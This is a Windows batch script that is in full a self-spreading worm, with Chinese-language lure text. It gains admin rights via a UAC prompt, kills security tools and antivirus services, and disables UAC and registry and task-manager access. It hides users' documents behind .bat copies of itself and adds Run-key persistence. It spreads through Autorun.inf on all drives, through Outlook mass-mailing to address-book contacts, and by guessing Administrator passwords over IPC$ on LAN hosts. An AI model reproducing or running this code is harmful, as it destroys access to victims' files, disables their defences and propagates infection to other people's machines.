@echo off

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
exit /B

:gotAdmin
if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
pushd "%CD%"
CD /D "%~dp0"

if "%1" == "h" goto begin
mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit

:begin
md C:\Windows\vir
set file1=C:\Windows\vir\mail.vbs
set file3=C:\Windows\vir\sys.bat
set file2=C:\Windows\vir\kill.bat
if exist %file1% (
goto f1ex
 ) else (
goto f1nx
)

:f3nx
md C:\Windows\vir
copy /y %0 C:\Windows\vir\sys.bat
goto begin

:f1ex
if exist %file3% (
goto f3ex
 ) else (
goto f3nx
)

:f3ex
if exist %file2% (
goto main
) else (
goto f2nx)

:f2nx
echo :1 >>C:\Windows\vir\kill.bat
echo taskkill /f /im taskmgr.exe >>C:\Windows\vir\kill.bat
echo taskkill /f /im regedit.exe >>C:\Windows\vir\kill.bat
echo taskkill /f /im gpedit.msc >>C:\Windows\vir\kill.bat
echo taskkill /f /im mmc.exe >>C:\Windows\vir\kill.bat
echo taskkill /f /im powershell.exe >>C:\Windows\vir\kill.bat
echo goto 1 >>C:\Windows\vir\kill.bat
goto begin

:f1nx
echo On Error Resume Next >>C:\Windows\vir\mail.vbs
echo For x=1 To 100 >>C:\Windows\vir\mail.vbs
echo Set Mail=ol.CreateItem(0) >>C:\Windows\vir\mail.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >>C:\Window\vir\mail.vbs
echo Mail.Subject="重要资料" >>C:\Windows\vir\mail.vbs
echo Mail.Body="这里有一份对你十分重要的资料。请不要告诉别人，将附件下载下来后双击查看" >>C:\Windows\vir\mail.vbs
echo Mail.Attachments.Add("C:\Windows\vir\sys.bat") >>C:\Windows\vir\mail.vbs
echo Mail.Send >>C:\Windows\vir\mail.vbs
echo Next >>C:\Windows\vir\mail.vbs
echo ol.Quit >>C:\Windows\vir\mail.vbs
goto begin

:main
taskkill /f /im taskmgr.exe
taskkill /f /im regedit.exe
taskkill /f /im gpedit.msc
taskkill /f /im 360safe.exe
taskkill /f /im 360tray.exe
taskkill /f /im hytray.exe
taskkill /f /im hips*
taskkill /f /im 360*
taskkill /f /im hy*
taskkill /f /im 2345*
net stop navapsvc
net stop wscsvc
net stop KPfwSvc
net stop SNDSrvc
net stop ccProxy
net stop ccEvtMgr
net stop ccSetMgr
net stop SPBBCSvc
net stop Symantec 
net stop NPFMntor 
net stop MskService
net stop FireSvc 
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
cd /d C:\
for /f "delims=?" %%c in ('dir/s/b/a-d C:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
for %%i in ( z:\ y:\ x:\ w:\ v:\ u:\ t:\ s:\ r:\ q:\ p:\ o:\ n:\m:\ l:\ k:\ i:\ j:\ h:\ g:\ f:\ e:\ d:\ c:\) do echo imh >> %%i\imh.txt
cd /d C:\
for /l %%i in (1,1,100) do (
copy /y  C:\Windows\vir\sys.bat C:\Users\%username%\desktop\%random%.bat
)
for %%i in ( z:\ y:\ x:\ w:\ v:\ u:\ t:\ s:\ r:\ q:\ p:\ o:\ n:\m:\ l:\ k:\ i:\ j:\ h:\ g:\ f:\ e:\ d:\ ) do ( 
copy /y  C:\Windows\sys.bat %%i\sys.bat
del /f /q %%i\Autorun.inf
echo [AutoRun]>>%%i\Autorun.inf
echo Open=sys.bat  >>%%i\Autorun.inf
echo 这里有一份对你非常重要的文件>>%%i\重要通知.txt
echo 请双击 sys.bat 以查看>>%%i\重要通知.txt
)
for %%i in ( z:\ y:\ x:\ w:\ v:\ u:\ t:\ s:\ r:\ q:\ p:\ o:\ n:\m:\ l:\ k:\ i:\ j:\ h:\ g:\ f:\ e:\ d:\ ) do ( 
copy /y  C:\Windows\vir\sys.bat %%i\AUTOEXEC.bat
)
copy C:\Windows\vir\sys.bat C:\Users\%username%\OneDrive
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL /v CheckedValue /t REG_DWORD /d 0 /f 
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v lin /t REG_SZ /d C:\Windows\vir\sys.bat /f
copy /y  C:\Windows\vir\sys.bat %temp%\system.bat
copy /y  C:\Windows\vir\sys.bat C:\Windows\system32\%RANDOM%.bat
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "sys" /t reg_sz /d "C:\Windows\vir\sys.bat" /f 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSetFolders /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t reg_sz /d http://www.4399.com /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun  /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDrives /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp /v NoRealMode /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskmgr  /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools  /t REG_DWORD /d 1 /f
start C:\Windows\vir\mail.vbs
goto f
:end
taskkill /f /im gpedit.msc
taskkill /f /im mmc.exe
taskkill /f /im 360*
taskkill /f /im 360tray.exe
taskkill /f /im hipstray.exe
goto f
:f
if exist D:\imh.txt (goto kd) 
if exist E:\imh.txt (goto ke) 
if exist F:\imh.txt (goto kf) 
if exist G:\imh.txt (goto kg) 
if exist H:\imh.txt (goto kh) 
if exist I:\imh.txt (goto ki) 
if exist J:\imh.txt (goto kj) 
if exist K:\imh.txt (goto kk) 
if exist L:\imh.txt (goto kl) 
if exist M:\imh.txt (goto km) 
if exist N:\imh.txt (goto kn) 
if exist O:\imh.txt (goto ko) 
if exist P:\imh.txt (goto kp) 
if exist Q:\imh.txt (goto kq) 
if exist R:\imh.txt (goto kr) 
if exist S:\imh.txt (goto ks) 
if exist T:\imh.txt (goto kt) 
if exist U:\imh.txt (goto ku) 
if exist V:\imh.txt (goto kv) 
if exist W:\imh.txt (goto kw) 
if exist X\imh.txt (goto kx) 
if exist Y:\imh.txt (goto ky) 
if exist Z:\imh.txt (goto kz) 
for %%i in ( z:\ y:\ x:\ w:\ v:\ u:\ t:\ s:\ r:\ q:\ p:\ o:\ n:\m:\ l:\ k:\ i:\ j:\ h:\ g:\ f:\ e:\ d:\ c:\) do echo imh >> %%i\imh.txt
for /f "skip=3 tokens=1,* delims= " %%i in ('arp -a') do (
net use \\%%i\ipc$ "" /user:"Administrator"
net use \\%%i\ipc$ "111111" /user:"Administrator"
net use \\%%i\ipc$ "admin" /user:"Administrator"
net use \\%%i\ipc$ "pass" /user:"Administrator"
net use \\%%i\ipc$ "123456" /user:"Administrator"
net use \\%%i\ipc$ "222222" /user:"Administrator"
net use \\%%i\ipc$ "password" /user:"Administrator"
net use \\%%i\ipc$ "passwd" /user:"Administrator"
net use \\%%i\ipc$ "administrator" /user:"Administrator"
copy C:\Windows\vir\sys.bat \\%%i\C:\sys.bat
schtasks /create /s %%i /sc WEEKLY /d MON /TN SYSTEM /TR C:\sys.bat
echo 重要文件，双击sys.bat以运行 >>C:\1.txt
copy C:\1.txt \\%%i\C:\重要通知.txt
)
goto end
:kd
if exist D:\finish.txt (del /f /q d:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d D:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q D:\imh.txt
echo win >>D:\finish.txt
goto f

:ke
if exist E:\finish.txt (del /f /q E:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d E:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q E:\imh.txt
echo win >>e:\finish.txt
goto f

:kf
if exist F:\finish.txt (del /f /q F:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d F:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q F:\imh.txt
echo win >>F:\finish.txt
goto f
:kg
if exist G:\finish.txt (del /f /q G:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d G:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q G:\imh.txt
echo win >>G:\finish.txt
goto f
:kh
if exist H:\finish.txt (del /f /q H:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d H:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q H:\imh.txt
echo win >>H:\finish.txt
goto f

:ki
if exist I:\finish.txt (del /f /q I:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d I:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q I:\imh.txt
echo win >>I:\finish.txt
goto f

:kj
if exist J:\finish.txt (del /f /q J:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d J:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q J:\imh.txt
echo win >>J:\finish.txt
goto f
:kk
if exist K:\finish.txt (del /f /q K:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d K:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q K:\imh.txt
echo win >>K:\finish.txt
goto f
:kl
if exist L:\finish.txt (del /f /q L:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d L:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q L:\imh.txt
echo win >>L:\finish.txt
goto f
:km
if exist M:\finish.txt (del /f /q M:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d M:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q M:\imh.txt
echo win >>M:\finish.txt
goto f
:kn
if exist N:\finish.txt (del /f /q N:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d N:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q N:\imh.txt
echo win >>N:\finish.txt
goto f

:ko
if exist O:\finish.txt (del /f /q O:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d O:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q O:\imh.txt
echo win >>O:\finish.txt
goto f

:kp
if exist P:\finish.txt (del /f /q P:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d P:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q P:\imh.txt
echo win >>P:\finish.txt
goto f

:kq
if exist Q:\finish.txt (del /f /q Q:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d Q:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q Q:\imh.txt
echo win >>Q:\finish.txt
goto f

:kr
if exist R:\finish.txt (del /f /q R:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d R:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q R:\imh.txt
echo win >>R:\finish.txt
goto f

:ks
if exist S:\finish.txt (del /f /q S:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d S:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q S:\imh.txt
echo win >>S:\finish.txt
goto f

:kt
if exist T:\finish.txt (del /f /q T:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d T:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
)
del /f /q T:\imh.txt
echo win >>T:\finish.txt
goto f

:ku
if exist U:\finish.txt (del /f /q U:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d U:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q U:\imh.txt
echo win >>U:\finish.txt
goto f

:kv
if exist V:\finish.txt (del /f /q V:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d V:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q V:\imh.txt
echo win >>V:\finish.txt
goto f

:kw
if exist W:\finish.txt (del /f /q W:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d W:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q W:\imh.txt
echo win >>W:\finish.txt
goto f

:kx
if exist X:\finish.txt (del /f /q X:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d X:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q X:\imh.txt
echo win >>X:\finish.txt
goto f

:ky
if exist Y:\finish.txt (del /f /q Y:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d Y:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q Y:\imh.txt
echo win >>Y:\finish.txt
goto f

:kz
if exist Z:\finish.txt (del /f /q Z:\imh.txt
goto f
)
for /f "delims=?" %%c in ('dir/s/b/a-d Z:\*.7z *.txt *.ppt *.pptx *.db *.accdb *.doc *.docx *.xls *.xlsx *.dll *.exe *.zip *.rar *.lnk') do (
copy /y  C:\Windows\vir\sys.bat %%c.bat
attrib +r +s +h %%c
taskkill /f /im gpedit.msc
)
del /f /q Z:\imh.txt
echo win >>Z:\finish.txt
goto f